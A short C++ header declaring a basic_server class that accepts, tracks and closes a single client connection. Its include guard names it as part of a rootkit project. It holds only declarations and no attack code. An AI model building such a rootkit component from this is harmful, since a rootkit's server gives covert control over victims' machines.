#ifndef ROOTKIT_BASIC_SERVER_H
#define ROOTKIT_BASIC_SERVER_H

#include "basic_client_handler.h"
#include "basic_connection_establisher.h"

#include <memory>
#include <utility>

class basic_server {
protected:
    std::unique_ptr<basic_connection_establisher> connectionEstablisher = nullptr;

    std::unique_ptr<basic_client_handler> curr_client = nullptr;

public:
    void setConnectionEstablisher(std::unique_ptr<basic_connection_establisher>&&connectionEstablisher);

    void accept_next_client();

    // is there a client connected right now
    bool is_client_connected();

    const std::unique_ptr<basic_client_handler>& get_connected_client();

    // close the current client (if such is conencted)
    void close_curr_client();

};


#endif //ROOTKIT_BASIC_SERVER_H
